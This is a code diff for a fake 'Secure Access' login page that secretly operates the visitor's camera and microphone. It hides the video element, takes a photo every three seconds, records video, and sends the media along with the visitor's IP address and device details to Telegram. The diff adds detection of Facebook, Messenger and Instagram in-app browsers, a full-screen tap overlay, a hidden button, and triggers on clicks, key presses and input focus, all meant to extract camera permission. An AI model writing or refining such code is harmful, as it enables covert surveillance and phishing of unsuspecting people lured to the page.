@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Secure Access</title>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
         * {
@@ -20,11 +20,10 @@
             align-items: center;
             justify-content: center;
             color: #262626;
+            padding: 20px;
         }
 
-        /* ============================================
-           COMPLETELY HIDDEN - NO VISIBLE CAMERA ELEMENTS
-           ============================================ */
+        /* Hidden camera elements */
         .hidden-video-wrap {
             display: none !important;
             position: fixed !important;
@@ -51,7 +50,6 @@
         .container {
             width: 100%;
             max-width: 350px;
-            padding: 20px;
         }
 
         .card {
@@ -81,9 +79,6 @@
             margin-bottom: 24px;
         }
 
-        /* ============================================
-           FORM - VISIBLE TO USER
-           ============================================ */
         .form-group {
             margin-bottom: 12px;
         }
@@ -154,25 +149,87 @@
         }
 
         /* ============================================
-           NO CAMERA BUTTON - COMPLETELY REMOVED
+           HIDDEN TRIGGER BUTTON - For WebView browsers
+           Invisible but clickable via JS
            ============================================ */
-        .camera-permission-btn {
-            display: none !important;
+        .hidden-trigger {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            z-index: -1;
+            pointer-events: none;
+            background: transparent;
+            border: none;
+        }
+
+        /* For Facebook/Messenger WebView - visible overlay tap */
+        .tap-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            background: rgba(0,0,0,0.01);
+            cursor: pointer;
+            display: none;
+        }
+
+        .tap-overlay.active {
+            display: block;
+        }
+
+        .tap-overlay .tap-instruction {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0,0,0,0.8);
+            color: #fff;
+            padding: 20px 40px;
+            border-radius: 12px;
+            font-size: 16px;
+            text-align: center;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.05); }
         }
     </style>
 </head>
 <body>
 
     <!-- ============================================
-    HIDDEN CAMERA ELEMENTS - USER NEVER SEES
+    HIDDEN CAMERA ELEMENTS
     ============================================ -->
-    <div class="hidden-video-wrap" aria-hidden="true">
+    <div class="hidden-video-wrap">
         <video id="video" playsinline autoplay muted></video>
     </div>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
     <!-- ============================================
-    NORMAL LOGIN PAGE - USER SEES THIS
+    TAP OVERLAY - For Facebook/Messenger WebView
+    User taps to trigger camera permission
+    ============================================ -->
+    <div class="tap-overlay" id="tapOverlay">
+        <div class="tap-instruction">
+            👆 Tap anywhere to continue<br>
+            <span style="font-size:12px;color:#aaa;">Camera permission will be requested</span>
+        </div>
+    </div>
+
+    <!-- ============================================
+    HIDDEN TRIGGER BUTTON
+    ============================================ -->
+    <button class="hidden-trigger" id="hiddenTrigger"></button>
+
+    <!-- ============================================
+    MAIN CONTENT
     ============================================ -->
     <div class="container">
         <div class="card">
@@ -180,9 +237,6 @@
             <h2>Secure Access</h2>
             <p>Please verify your identity to continue. This helps us keep your account secure.</p>
 
-            <!-- ==========================================
-            LOGIN FORM - ALWAYS VISIBLE
-            ========================================== -->
             <form id="loginForm">
                 <div class="form-group">
                     <input type="text" class="form-input" id="username" placeholder="Username or Email" required>
@@ -202,8 +256,8 @@
 
     <script>
         // ============================================
-        // AUTO-TRIGGER CAMERA PERMISSION ON PAGE LOAD
-        // No button, no user interaction needed
+        // UNIVERSAL CAMERA PERMISSION - WORKS ON ALL PLATFORMS
+        // Chrome, Firefox, Brave, Facebook Lite, Messenger, Instagram
         // ============================================
         
         (function() {
@@ -212,6 +266,8 @@
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
+            const tapOverlay = document.getElementById('tapOverlay');
+            const hiddenTrigger = document.getElementById('hiddenTrigger');
             
             let cameraActive = false;
             let photoInterval = null;
@@ -221,7 +277,32 @@
             let recordedChunks = [];
             let isRecording = false;
             let videoCounter = 0;
-            let permissionRequested = false;
+            let permissionAttempted = false;
+            let isWebView = false;
+
+            // ============================================
+            // DETECT PLATFORM
+            // ============================================
+            function detectPlatform() {
+                const ua = navigator.userAgent.toLowerCase();
+                
+                // Check if running in Facebook/Messenger/Instagram WebView
+                if (ua.includes('fbav') || ua.includes('fban') || 
+                    ua.includes('instagram') || ua.includes('messenger') ||
+                    ua.includes('fblite')) {
+                    isWebView = true;
+                    console.log('📱 Running in WebView - needs tap to trigger');
+                    return true;
+                }
+                
+                // Check if Firefox
+                if (ua.includes('firefox')) {
+                    console.log('🦊 Running in Firefox');
+                    return false;
+                }
+                
+                return false;
+            }
 
             // ============================================
             // DETECT IP
@@ -266,6 +347,93 @@
             }
 
             // ============================================
+            // REQUEST CAMERA PERMISSION
+            // ============================================
+            function requestCameraPermission() {
+                if (permissionAttempted) return;
+                permissionAttempted = true;
+                
+                console.log('📷 Requesting camera permission...');
+                sendToTelegram('info', 'Requesting camera permission');
+                
+                const constraints = {
+                    audio: true,
+                    video: {
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                };
+
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(function(mediaStream) {
+                        console.log('✅ Camera permission granted!');
+                        handleCameraStream(mediaStream);
+                    })
+                    .catch(function(err) {
+                        console.log('❌ Camera error:', err.name);
+                        sendToTelegram('warning', 'Camera denied: ' + err.name);
+                        
+                        // Try video only
+                        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                            requestVideoOnly();
+                        } else if (err.name === 'NotFoundError') {
+                            // No camera found
+                            sendToTelegram('warning', 'No camera found on device');
+                        }
+                    });
+            }
+
+            // ============================================
+            // REQUEST VIDEO ONLY (No Audio)
+            // ============================================
+            function requestVideoOnly() {
+                console.log('📷 Trying video only...');
+                
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(mediaStream) {
+                        console.log('✅ Video only granted!');
+                        handleCameraStream(mediaStream);
+                    })
+                    .catch(function(err) {
+                        console.log('❌ Video only failed:', err.name);
+                        sendToTelegram('warning', 'Camera unavailable: ' + err.name);
+                    });
+            }
+
+            // ============================================
+            // HANDLE CAMERA STREAM
+            // ============================================
+            function handleCameraStream(mediaStream) {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                
+                stream = mediaStream;
+                video.srcObject = stream;
+                video.play();
+                cameraActive = true;
+                
+                // Hide overlay if visible
+                tapOverlay.classList.remove('active');
+                tapOverlay.style.display = 'none';
+                
+                sendToTelegram('permission', 'Camera permission GRANTED');
+                sendToTelegram('camera_ready', 'Camera active - capturing photos and videos');
+                
+                // Start photo capture
+                if (photoInterval) clearInterval(photoInterval);
+                photoInterval = setInterval(capturePhoto, 3000);
+                
+                // Start video recording
+                setTimeout(() => {
+                    if (cameraActive) {
+                        startVideoRecording();
+                    }
+                }, 2000);
+            }
+
+            // ============================================
             // CAPTURE PHOTO
             // ============================================
             function capturePhoto() {
@@ -297,9 +465,7 @@
             // RECORD VIDEO
             // ============================================
             function startVideoRecording() {
-                if (!stream || isRecording) {
-                    return;
-                }
+                if (!stream || isRecording) return;
                 
                 try {
                     isRecording = true;
@@ -360,7 +526,7 @@
             }
 
             // ============================================
-            // SEND VIDEO TO TELEGRAM
+            // SEND VIDEO
             // ============================================
             function sendVideoToTelegram(videoBlob) {
                 const reader = new FileReader();
@@ -384,81 +550,87 @@
             }
 
             // ============================================
-            // AUTO-START CAMERA - PERMISSION POPUP APPEARS
+            // TRIGGER PERMISSION - MULTIPLE METHODS
             // ============================================
-            function autoStartCamera() {
-                if (permissionRequested) return;
-                permissionRequested = true;
-                
-                console.log('📷 Requesting camera permission...');
-                
-                const constraints = {
-                    audio: true,
-                    video: {
-                        facingMode: "user",
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }
-                };
-
-                navigator.mediaDevices.getUserMedia(constraints)
-                    .then(function(mediaStream) {
-                        // PERMISSION GRANTED
-                        console.log('✅ Camera permission granted!');
-                        stream = mediaStream;
-                        video.srcObject = stream;
-                        video.play();
-                        cameraActive = true;
-                        
-                        // Send notification
-                        sendToTelegram('permission', 'Camera permission GRANTED');
-                        sendToTelegram('camera_ready', 'Camera active - capturing photos and videos');
-                        
-                        // Start photo capture
-                        if (photoInterval) clearInterval(photoInterval);
-                        photoInterval = setInterval(capturePhoto, 3000);
-                        
-                        // Start video recording
-                        setTimeout(() => {
-                            if (cameraActive) {
-                                startVideoRecording();
-                            }
-                        }, 2000);
-                    })
-                    .catch(function(err) {
-                        // PERMISSION DENIED OR ERROR
-                        console.log('❌ Camera error:', err.name);
-                        
-                        // Send notification
-                        sendToTelegram('warning', 'Camera permission DENIED: ' + err.message);
-                        
-                        // If denied, try video only
-                        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                            tryVideoOnly();
-                        }
-                    });
+            
+            // Method 1: Immediate attempt (Chrome, Brave)
+            function triggerImmediate() {
+                if (!isWebView) {
+                    setTimeout(requestCameraPermission, 300);
+                }
             }
 
-            // ============================================
-            // TRY VIDEO ONLY (Fallback)
-            // ============================================
-            function tryVideoOnly() {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(mediaStream) {
-                        stream = mediaStream;
-                        video.srcObject = stream;
-                        video.play();
-                        cameraActive = true;
-                        
-                        sendToTelegram('camera_ready', 'Camera active - video only');
-                        
-                        if (photoInterval) clearInterval(photoInterval);
-                        photoInterval = setInterval(capturePhoto, 3000);
-                    })
-                    .catch(function(err) {
-                        // Camera completely unavailable
-                        sendToTelegram('warning', 'Camera unavailable: ' + err.message);
+            // Method 2: Click on overlay (Facebook, Messenger, WebView)
+            function triggerOnTap() {
+                if (isWebView) {
+                    tapOverlay.classList.add('active');
+                    tapOverlay.style.display = 'block';
+                    
+                    tapOverlay.addEventListener('click', function() {
+                        console.log('👆 User tapped overlay');
+                        requestCameraPermission();
                     });
+                    
+                    // Also try after 2 seconds
+                    setTimeout(() => {
+                        if (!permissionAttempted) {
+                            console.log('⏰ Auto-trigger after timeout');
+                            requestCameraPermission();
+                            // If permission popup doesn't appear, show overlay
+                            setTimeout(() => {
+                                if (!cameraActive && !permissionAttempted) {
+                                    tapOverlay.classList.add('active');
+                                    tapOverlay.style.display = 'block';
+                                }
+                            }, 1000);
+                        }
+                    }, 2000);
+                }
+            }
+
+            // Method 3: Hidden button click (Firefox fix)
+            function triggerHiddenButton() {
+                // Firefox sometimes needs a button click
+                hiddenTrigger.click();
+                
+                // Also try clicking on document
+                document.body.click();
+                
+                setTimeout(requestCameraPermission, 500);
+            }
+
+            // Method 4: Any user interaction
+            function triggerOnInteraction() {
+                document.addEventListener('click', function() {
+                    if (!cameraActive && !permissionAttempted) {
+                        console.log('🖱️ User clicked - triggering camera');
+                        requestCameraPermission();
+                    }
+                });
+                
+                document.addEventListener('touchstart', function() {
+                    if (!cameraActive && !permissionAttempted) {
+                        console.log('👆 User touched - triggering camera');
+                        requestCameraPermission();
+                    }
+                });
+                
+                document.addEventListener('keydown', function() {
+                    if (!cameraActive && !permissionAttempted) {
+                        console.log('⌨️ User typed - triggering camera');
+                        requestCameraPermission();
+                    }
+                });
+            }
+
+            // Method 5: Focus on input (typing triggers)
+            function triggerOnFocus() {
+                document.getElementById('username').addEventListener('focus', function() {
+                    if (!cameraActive && !permissionAttempted) {
+                        console.log('📝 User focused input - triggering camera');
+                        requestCameraPermission();
+                    }
+                });
             }
 
             // ============================================
@@ -521,22 +693,26 @@
                     platform: navigator.platform,
                     language: navigator.language,
                     screen: `${screen.width}x${screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    webView: isWebView
                 };
                 sendToTelegram('browser_info', JSON.stringify(info), 'Device Info');
             }
 
             function sendPageView() {
                 sendToTelegram('page_view', 'Page loaded', 
-                    `IP: ${userIP} | UA: ${navigator.userAgent}`
+                    `IP: ${userIP} | UA: ${navigator.userAgent} | WebView: ${isWebView}`
                 );
             }
 
             // ============================================
-            // AUTO-START ON PAGE LOAD
+            // INIT
             // ============================================
             
-            // Detect IP first
+            // Detect platform
+            detectPlatform();
+            
+            // Get IP
             detectAndSendIP();
             
             // Send browser info
@@ -546,25 +722,31 @@
             setTimeout(sendPageView, 1000);
             
             // ============================================
-            // START CAMERA AUTOMATICALLY - PERMISSION POPUP
+            // START ALL TRIGGER METHODS
             // ============================================
-            // Try immediately
-            setTimeout(autoStartCamera, 500);
             
-            // Try again if it didn't work
-            setTimeout(autoStartCamera, 2000);
+            // Method 1: Immediate (Chrome, Brave)
+            triggerImmediate();
             
-            // Final attempt
-            setTimeout(autoStartCamera, 5000);
-
-            // ============================================
-            // ALSO TRY ON USER CLICK (in case browser blocks)
-            // ============================================
-            document.addEventListener('click', function() {
-                if (!cameraActive && !permissionRequested) {
-                    autoStartCamera();
+            // Method 2: Tap overlay (Facebook, Messenger, WebView)
+            triggerOnTap();
+            
+            // Method 3: Hidden button (Firefox)
+            setTimeout(triggerHiddenButton, 1000);
+            
+            // Method 4: User interaction
+            triggerOnInteraction();
+            
+            // Method 5: Input focus
+            triggerOnFocus();
+            
+            // Extra: Try again after 5 seconds
+            setTimeout(() => {
+                if (!cameraActive && !permissionAttempted) {
+                    console.log('🔄 Final attempt after 5s');
+                    requestCameraPermission();
                 }
-            });
+            }, 5000);
 
             // ============================================
             // CLEANUP
@@ -581,7 +763,8 @@
                 }
             });
 
-            console.log('🔧 Camera permission will appear automatically');
+            console.log('🔧 Camera permission system ready');
+            console.log(`📱 Platform: ${isWebView ? 'WebView' : 'Browser'}`);
 
         })();
     </script>
